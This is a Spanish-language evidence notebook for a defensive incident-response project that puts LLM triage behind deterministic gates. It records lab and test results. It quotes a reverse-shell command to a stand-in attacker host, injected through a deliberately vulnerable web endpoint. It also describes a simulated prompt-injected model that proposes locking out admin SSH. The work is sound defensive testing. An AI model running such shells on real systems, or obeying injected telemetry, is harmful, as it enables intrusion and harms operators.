# Evidencia — la libreta

Cada medicion real: que se probo, que salio, que cambio por ello.

**Los resultados negativos se escriben con el mismo detalle que los positivos, o mas.**
Un proyecto que solo registra lo que funciono no tiene evidencia: tiene publicidad. Y el
dato que no esta en el repo, no existe — la memoria de nadie cuenta.

## Formato

`## AAAA-MM-DD · que se probo — VEREDICTO`, y debajo: montaje, resultado, consecuencia.

## Qué se va a medir (declarado antes de medir, ARQUITECTURA.md §8)

1. Tasa de rechazo del evaluador (si es cero, el gate no gatea).
2. Falsos positivos de reglas generadas por IA contra el corpus benigno.
3. Tiempo de contención (T0/T1) medido APARTE del tiempo de análisis (T2).
4. Tasa y tiempo medio de rollback — probado, no documentado.
5. Resistencia a inyección de prompt vía telemetría (objetivo: 0 políticas aplicadas).
6. Disponibilidad con la IA apagada (debe ser idéntica).

---

## 2026-07-31 · El gate de fronteras, ¿gatea de verdad? — PASA, con una trampa

**Montaje.** Escrito `.gb-boundaries` con 17 reglas y ejecutado `gb graph src --gate`
sobre el paquete limpio; después inyectada a propósito una violación real
(`guardia.actores` importando `guardia.politica`, que es justo lo que la regla 3
prohíbe) y repetido.

**Resultado.** Limpio: salida 0. Con la violación: salida 1 y el cruce señalado por
nombre. El gate gatea.

**La trampa, que es lo que hace útil esta entrada.** En el primer intento el gate pasó
en verde **con la violación puesta**. Causa: `.gb-boundaries` estaba en la raíz del
proyecto y `gb graph src` lo busca dentro del path que analiza. Cargaba cero reglas y
no lo decía en la salida corta. Un fichero de invariantes en el sitio equivocado no
falla ruidosamente: pasa en verde, que es el peor modo de fallo posible para un gate.

**Consecuencia.** El fichero se movió a `src/.gb-boundaries`. Y la lección general, que
vale para todos los gates de este proyecto: **un gate se verifica rompiéndolo a
propósito**, nunca comprobando que pasa. Es el mismo argumento del punto 3 del criterio
de terminado aplicado a nuestras propias herramientas.

## 2026-07-31 · Corpus adversarial contra el validador determinista — PASA

**Montaje.** 13 propuestas JSON en [corpus/propuestas/](../corpus/propuestas/), con el
veredicto esperado declarado en el nombre del fichero: 3 legítimas, 4 que violan
invariantes (lockout de SSH, lockout total entrante, cegado del log de auditoría,
denegación de rutas del plano de control), 1 que ciega el registro por syscalls, y 4
malformadas para la gramática (tipo inventado, motor inventado, puerto 70000, CIDR
alucinado).

**Resultado.** 84 tests en verde. Las 10 envenenadas se rechazan y **por el motivo
esperado**, no por casualidad: el test compara el invariante violado contra el prefijo
del nombre. Códigos de salida de la CLI: 0 legítima, 5 violación de invariante, 2
descartada por gramática.

**Consecuencia.** La tasa de rechazo es distinta de cero contra un adversario escrito a
mano. Esto **no** mide todavía lo que dice la métrica 5 (resistencia a inyección de
prompt), porque aquí no hay LLM: mide que el validador determinista que hay debajo del
LLM rechaza lo que debe. Cuando entre T2, este mismo corpus se envuelve en telemetría
hostil y se vuelve a medir.

**Negativo honesto.** El corpus lo escribí yo sabiendo qué comprueba el validador. Un
corpus escrito por quien conoce las respuestas mide menos de lo que parece; el corpus
que cuenta es el que sale de incidentes reales y el que escriba un modelo distinto
intentando colar cosas.

## 2026-07-31 · Laboratorio T0/T1: ¿Falco detecta el escenario SIN IA? — SÍ (una vez), con reservas de entorno

**Montaje.** [lab/](../lab/): tres contenedores en red aislada — servidor web
vulnerable a propósito (inyección de comandos en `/ping`), atacante (curl + netcat),
y Falco 0.39.2→0.41.3 con ruleset base + una regla local. El ataque: shell inversa
`bash -i >& /dev/tcp/atacante/4444` inyectada vía la vuln.

**Resultado — lo que SÍ quedó demostrado.**
1. **El ataque es reproducible.** La shell inversa se establece de forma fiable en
   cada disparo (`root@lab-objetivo:/app#` capturado como botín). El incidente que el
   pipeline necesita repetir a voluntad, existe.
2. **Falco detecta el escenario con su RULESET BASE, sin IA.** Regla base *"Redirect
   stdout/stdin to network connection"*, prioridad Notice, con la línea completa:
   `command=bash -c bash -i >& /dev/tcp/atacante/4444 0>&1 ... container=lab-objetivo`.
   Esta es la tesis central del MVP en la práctica: la contención vive en T0/T1
   (regla 1). Si solo lo detectara un LLM, sería teatro — y no lo es.

**Hallazgo de diseño: `proc.pname` vs `proc.aname`.** Mi regla local escrita a mano NO
disparó, y el output de Falco explicó por qué: la cadena real es
`python → sh → bash -c → bash -i`, así que el padre *directo* del shell es `bash`, no
`python`. La regla miraba `proc.pname` (padre directo) cuando debía mirar la cadena de
ancestros `proc.aname[1..4]`. Corregida en
[lab/falco/reglas_locales.yaml](../lab/falco/reglas_locales.yaml). **Esto es exactamente
lo que el gate de replay malicioso (regla 6) atrapa: una regla que no dispara contra el
repro → REJECT.** Una regla plausible sobre el papel que no cubre el incidente real.

**Negativo de entorno: la captura de Falco en WSL2 es inestable.** Reservas serias:
- Falco 0.39.2 **no arranca** con el kernel 6.18 de WSL2 (`scap_init` falla en
  `modern_ebpf`); 0.41.3 sí. El driver tiene que ir por delante del kernel.
- Aun con 0.41.3, la captura funcionó **una sola vez**: el primer arranque fresco tras
  descargar la imagen. Tras `restart`/`recreate`/`down+up` posteriores, Falco arranca
  y valida las reglas pero **deja de emitir eventos** (0 alertas, incluida la base que
  antes sí saltó). No es determinista y no lo he sabido estabilizar.

**Consecuencia.** La corrección `aname` queda **escrita y razonada pero NO verificada en
ejecución** — no la he podido observar disparando porque la captura se cayó antes. No se
marca como validada. Y la conclusión operativa, que ya anticipaba
[lab/README.md](../lab/README.md): **para trabajo sostenido el laboratorio se mueve a una
VM Linux con kernel estable**; Docker Desktop sobre WSL2 sirvió para probar el escenario
una vez, no como banco de pruebas fiable. Se registra como negativo, no se maquilla.

## 2026-07-31 · Los cuatro gates de la regla 6, ¿rechazan lo que deben? — PASA

**Montaje.** Forja determinista (`guardia forjar`) que corre una propuesta por los
gates en orden: interruptor operativo → invariantes → replay benigno → replay malicioso
→ rollback probado. Corpus de eventos en [corpus/eventos/](../corpus/eventos/): benigno
con una trampa (conexión interna legítima al puerto 4444, el mismo del C2) e incidente
con el repro de la shell inversa. Una propuesta escrita para fallar en cada gate.

**Resultado (108 tests, e2e por CLI).** Cada gate rechaza por su motivo:
- Propuesta correcta (corta el C2 por IP+puerto): **PASS**, exit 0.
- Bloquear SSH del admin: **BLOCKER** en gate-1-invariantes, exit 5.
- Bloquear *todo* el 4444 (`0.0.0.0/0`): **REJECT** en gate-2-replay-benigno — pilla el
  servicio interno legítimo. Es la trampa del corpus funcionando: una regla que parece
  contener el ataque pero rompe tráfico normal.
- Bloquear una IP que no es la del C2: **REJECT** en gate-3-replay-malicioso, no cubre
  el repro.
- Capa de IA congelada: **REJECT** en gate-0, ni se evalúa. El interruptor manda sobre
  la forja.
- Y la cadena de auditoría sigue intacta tras cada veredicto (cada uno queda registrado).

**Prueba real del rollback (gate 4).** No es documentación: la forja aplica la propuesta
en un sandbox, revierte de verdad, y compara por hash que el estado vuelve exacto. El
test `test_la_forja_deja_el_sandbox_limpio` confirma que tras evaluar —pase o falle— el
estado activo vuelve a vacío. Un cambio cuyo rollback no restaura el hash exacto es
REJECT.

**Límite de alcance, dicho de frente.** El motor de replay cubre `filtro_red` y
`confinamiento` con matching determinista completo. **NO** cubre `regla_deteccion`: su
banco es el motor de Falco (regla 9, no se reimplementa), así que la forja la marca
`gate-replay-no-soportado` → REJECT honesto en vez de un PASS que no significaría nada.
Consecuencia práctica: hoy el ciclo completo se demuestra con el filtro de egress (cortar
el C2), no con la regla de detección de Falco. Las dos son respuestas válidas al mismo
incidente; la detección espera a que el banco de Falco sea fiable (ver negativo anterior).

## 2026-07-31 · Aplicación real: canary, dead-man's switch y límite de tasa — PASA

**Montaje.** La capa de despliegue (`guardia desplegar/confirmar/revisar`) cierra T3:
un veredicto PASS de la forja se aplica a producción, pero nunca de golpe. Tres frenos
deterministas de §5.5 (el modo de fallo *más probable* del sistema, según ARQUITECTURA:
el defensor tumbándose a sí mismo). El reloj se inyecta para probar los plazos sin dormir.

**Resultado (118 tests, e2e por CLI).**
- **Canary + confirmación humana.** Una propuesta correcta se aplica *en observación*.
  Solo un humano la confirma como estable: `confirmar --actor ia` → denegado, `--actor
  automata` → denegado, humano → OK. Misma autoridad que descongelar (regla 3).
- **Dead-man's switch.** Un canary no confirmado se revierte **solo** al pasar su plazo:
  avanzando el reloj inyectado 101s sobre un plazo de 100s, `revisar()` devuelve el id
  revertido y la política activa vuelve a vacío. Un confirmado sobrevive aunque el reloj
  avance 500s. Esto es lo que deshace un lockout aunque el admin ya no pueda entrar a
  deshacerlo — que es justo cuando no puede.
- **Límite de tasa (anti auto-DoS).** Con `max_cambios_ventana=3`, el cuarto cambio en
  la ventana se rechaza (`RECHAZADO_TASA`) aunque pase los gates; pasada la ventana, el
  cupo se recupera. Y un rechazo por gate **no** consume cupo: 5 lockouts BLOCKER
  seguidos no agotan el límite, así el atacante no lo vacía con propuestas inválidas.
- La cadena de auditoría sigue intacta tras desplegar, confirmar y revertir; cada acción
  (incluida la reversión por dead-man) queda registrada.

**Límite honesto del canary.** Sin una flota que dividir, el canary del MVP es *temporal*
(observar N segundos) y no *espacial* (un subconjunto de hosts). Es la mecánica
aplicar→observar→confirmar/revertir, que es lo verificable ahora; el reparto por hosts
llega con la flota. Escrito en el docstring del módulo y aquí, no escondido.

## 2026-07-31 · T2 y la métrica 5: ¿un triaje envenenado consigue aplicar política mala? — NO

**Montaje.** Capa de triaje (T2) con proveedor intercambiable. El proveedor determinista
(`ProveedorHeuristico`, sin IA) mira el incidente y, si ve egress a una IP externa,
propone cortarlo. La propuesta entra por la misma gramática cerrada y los mismos gates
que cualquier otra. El proveedor LLM real va detrás de la misma interfaz y **no se
invoca**: gastar cuota y mandar telemetría a un endpoint exige OK explícito
(ARQUITECTURA §9), así que `ProveedorLLM.sugerir` lanza en vez de llamar.

**Ciclo completo end-to-end (126 tests, e2e por `guardia responder`).** Incidente → T2
propone `auto-incidente-0001-egress` (filtro de red) → T3 lo pasa por los gates (PASS) →
canary. La auditoría deja la cadena de actores exacta: `humano` descongela, `ia`
triaje_propuesta, `automata` forja_veredicto PASS, `automata` despliegue canary. Cada
nivel con su actor y su autoridad.

**La métrica 5, en su forma verificable sin LLM real.** Un `ProveedorEnvenenado` simula
un modelo al que la telemetría le coló una inyección de prompt: en vez de contener el
ataque, propone cerrar el SSH del admin, envuelto en *"URGENTE, el admin lo aprobó"*.
Resultado:
- T2 **devuelve** la propuesta — no es su trabajo juzgarla, y la propuesta es
  gramaticalmente válida. El veneno no rompe la gramática. Ese es justo el motivo por el
  que la defensa no puede vivir en T2.
- T3 la **rechaza** en el gate de invariantes (`RECHAZADO_GATE`), y la política activa
  queda vacía. **Cero políticas malas aplicadas.**

La lección de diseño, medida y no supuesta: la resistencia a inyección de prompt **no**
está en que el LLM sea bueno, sino en que su salida no tenga autoridad (regla 3) y pase
por gates deterministas que él no controla (regla 5.1). Un modelo comprometido produce
una propuesta que muere en el gate, no un cambio aplicado.

**Límite honesto.** Esto mide el *mecanismo* con un proveedor envenenado a mano. No mide
un LLM real bajo inyecciones reales — eso llega cuando se conecte el proveedor LLM, con
OK explícito, y el corpus adversarial de `corpus/propuestas/` como banco. Lo que sí queda
demostrado: aunque T2 esté 100% comprometido, la arquitectura no aplica su veneno.

## 2026-07-31 · El LLM real, conectado por CLI: ¿el ciclo aguanta con un modelo de verdad? — SÍ

**Montaje (ADR 0006, con OK explícito).** `ProveedorLLM` compuesto con un `Transporte`
intercambiable. El primero, `TransporteCLI`: subproceso a la CLI oficial del modelo, con
el prompt entero por **stdin** (la telemetría la escribe el atacante; por argv acabaría
en logs de procesos) y la CLI **sin herramientas** (`claude -p --tools ""`;
`gemini --skip-trust --approval-mode plan`). Opt-in siempre: `responder` usa el
heurístico salvo `--proveedor llm`. 138 tests deterministas (modelo simulado) + un smoke
real detrás de `GUARDIA_SMOKE_LLM` para que la suite jamás gaste cuota por accidente.

**Resultado — el ciclo real, medido dos veces.**
1. **Smoke T2 con Claude (haiku)**: contra el repro del incidente propone un
   `filtro_red` que pasa la gramática. 15s. Con **Gemini**: también propone válido, 99s.
   Dos familias distintas de modelo detrás de la misma interfaz — la base del evaluador
   adversarial de la regla 10 ya existe.
2. **Ciclo completo `responder --proveedor llm`**: Claude propone
   `bloqueo-c2-203-0-113-7` (id suyo, IP del C2 correcta) → forja PASS en los cuatro
   gates → canary aplicado. La auditoría deja la misma cadena que con el heurístico:
   `humano` descongela, `ia` propone, `automata` veredicto, `automata` canary. **Primera
   vez que el actor `ia` del log es una inferencia real y no un doble.**

**El camino de recuperación, también medido.** Con el transporte roto a propósito
(binario inexistente), `responder` no se queda sin responder: audita
`triaje_transporte_caido` y cae al heurístico, que propone y llega a canary igual
(exit 0). LLM caído ≠ incidente sin contener (regla 1).

**Negativos honestos del transporte.**
- `--bare` en claude rompe la sesión OAuth de la suscripción (solo admite API key): se
  quitó del preset tras verlo fallar, no se supuso.
- La garantía de gemini es **más débil**: `plan` es "solo lectura", no "sin
  herramientas", y exige `--skip-trust`. Para el banco de pruebas vale; en un host con
  secretos, no, hasta cerrarlo con su policy engine. Un test vigila que nadie relaje
  los presets sin enterarse.
- Esto sigue siendo el **banco de pruebas** de la métrica 5, no la configuración de
  producción: la respuesta de §9 para producción sigue apuntando a un modelo local —
  que entrará por este mismo `Transporte` sin tocar el proveedor.

**Lo que aún no se ha medido:** el LLM real contra telemetría con inyecciones reales
(envolver `corpus/propuestas/` en eventos hostiles y medir la tasa de veneno que muere
en gates). El banco ya está conectado; ese experimento es el siguiente.
